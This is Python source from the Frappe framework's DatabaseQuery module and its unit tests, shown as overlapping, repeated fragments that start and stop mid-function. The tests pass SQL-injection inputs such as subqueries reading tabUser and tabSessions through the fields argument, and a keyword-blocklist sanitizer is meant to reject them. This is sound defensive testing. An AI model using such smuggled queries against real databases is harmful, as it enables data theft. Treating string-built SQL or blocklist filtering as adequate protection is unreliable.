		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt
from __future__ import unicode_literals

import frappe, unittest

from frappe.model.db_query import DatabaseQuery
from frappe.desk.reportview import get_filters_cond

class TestReportview(unittest.TestCase):
	def test_basic(self):
		self.assertTrue({"name":"DocType"} in DatabaseQuery("DocType").execute(limit_page_length=None))

	def test_fields(self):
		self.assertTrue({"name":"DocType", "issingle":0} \
			in DatabaseQuery("DocType").execute(fields=["name", "issingle"], limit_page_length=None))

	def test_filters_1(self):
		self.assertFalse({"name":"DocType"} \
			in DatabaseQuery("DocType").execute(filters=[["DocType", "name", "like", "J%"]]))

	def test_filters_2(self):
		self.assertFalse({"name":"DocType"} \
			in DatabaseQuery("DocType").execute(filters=[{"name": ["like", "J%"]}]))

	def test_filters_3(self):
		self.assertFalse({"name":"DocType"} \
			in DatabaseQuery("DocType").execute(filters={"name": ["like", "J%"]}))

	def test_filters_4(self):
		self.assertTrue({"name":"DocField"} \
			in DatabaseQuery("DocType").execute(filters={"name": "DocField"}))

	def test_in_not_in_filters(self):
		self.assertFalse(DatabaseQuery("DocType").execute(filters={"name": ["in", None]}))
		self.assertTrue({"name":"DocType"} \
				in DatabaseQuery("DocType").execute(filters={"name": ["not in", None]}))

		for result in [{"name":"DocType"}, {"name":"DocField"}]:
			self.assertTrue(result
				in DatabaseQuery("DocType").execute(filters={"name": ["in", 'DocType,DocField']}))

		for result in [{"name":"DocType"}, {"name":"DocField"}]:
			self.assertFalse(result
				in DatabaseQuery("DocType").execute(filters={"name": ["not in", 'DocType,DocField']}))

	def test_or_filters(self):
		data = DatabaseQuery("DocField").execute(
				filters={"parent": "DocType"}, fields=["fieldname", "fieldtype"],
				or_filters=[{"fieldtype":"Table"}, {"fieldtype":"Select"}])

		self.assertTrue({"fieldtype":"Table", "fieldname":"fields"} in data)
		self.assertTrue({"fieldtype":"Select", "fieldname":"document_type"} in data)
		self.assertFalse({"fieldtype":"Check", "fieldname":"issingle"} in data)

	def test_between_filters(self):
		""" test case to check between filter for date fields """
		frappe.db.sql("delete from tabEvent")

		# create events to test the between operator filter
		todays_event = create_event()
		event1 = create_event(starts_on="2016-07-05 23:59:59")
		event2 = create_event(starts_on="2016-07-06 00:00:00")
		event3 = create_event(starts_on="2016-07-07 23:59:59")
		event4 = create_event(starts_on="2016-07-08 00:00:01")

		# if the values are not passed in filters then event should be filter as current datetime
		data = DatabaseQuery("Event").execute(
			filters={"starts_on": ["between", None]}, fields=["name"])

		self.assertTrue({ "name": event1.name } not in data)

		# if both from and to_date values are passed
		data = DatabaseQuery("Event").execute(
			filters={"starts_on": ["between", ["2016-07-06", "2016-07-07"]]},
			fields=["name"])

		self.assertTrue({ "name": event2.name } in data)
		self.assertTrue({ "name": event3.name } in data)
		self.assertTrue({ "name": event1.name } not in data)
		self.assertTrue({ "name": event4.name } not in data)

		# if only one value is passed in the filter
		data = DatabaseQuery("Event").execute(
			filters={"starts_on": ["between", ["2016-07-07"]]},
			fields=["name"])

		self.assertTrue({ "name": event3.name } in data)
		self.assertTrue({ "name": event4.name } in data)
		self.assertTrue({ "name": todays_event.name } in data)
		self.assertTrue({ "name": event1.name } not in data)
		self.assertTrue({ "name": event2.name } not in data)

	def test_ignore_permissions_for_get_filters_cond(self):
		frappe.set_user('test1@example.com')
		self.assertRaises(frappe.PermissionError, get_filters_cond, 'DocType', dict(istable=1), [])
		self.assertTrue(get_filters_cond('DocType', dict(istable=1), [], ignore_permissions=True))
		frappe.set_user('Administrator')

	def test_query_fields_sanitizer(self):
		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
				fields=["name", "issingle, version()"], limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, IF(issingle=1, (select name from tabUser), count(name))"],
			limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, (select count(*) from tabSessions)"],
			limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, SELECT LOCATE('', `tabUser`.`user`) AS user;"],
			limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, IF(issingle=1, (SELECT name from tabUser), count(*))"],
			limit_start=0, limit_page_length=1)

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle", "count(name)"],
			limit_start=0, limit_page_length=1)
		self.assertTrue('count(name)' in data[0])

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle", "locate('', name) as _relevance"],
			limit_start=0, limit_page_length=1)
		self.assertTrue('_relevance' in data[0])

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle", "date(creation) as creation"],
			limit_start=0, limit_page_length=1)
		self.assertTrue('creation' in data[0])

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle",
			"datediff(modified, creation) as date_diff"], limit_start=0, limit_page_length=1)
		self.assertTrue('date_diff' in data[0])

def create_event(subject="_Test Event", starts_on=None):
	""" create a test event """

	from frappe.utils import get_datetime

	event = frappe.get_doc({
		"doctype": "Event",
		"subject": subject,
		"event_type": "Public",
		"starts_on": get_datetime(starts_on),
	}).insert(ignore_permissions=True)

	return event                    


# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''

		sub_query_regex = re.compile("^.*[,();].*")
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']                    
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)                    

		for field in self.fields:
			if sub_query_regex.match(field):
				if any(keyword in field.lower().split() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("({0}".format(keyword) in field.lower() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() for keyword in blacklisted_functions):
					_raise_exception()

			if re.compile("[a-zA-Z]+\s*'").match(field):
				_raise_exception()

			if re.compile('[a-zA-Z]+\s*,').match(field):
				_raise_exception()

	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

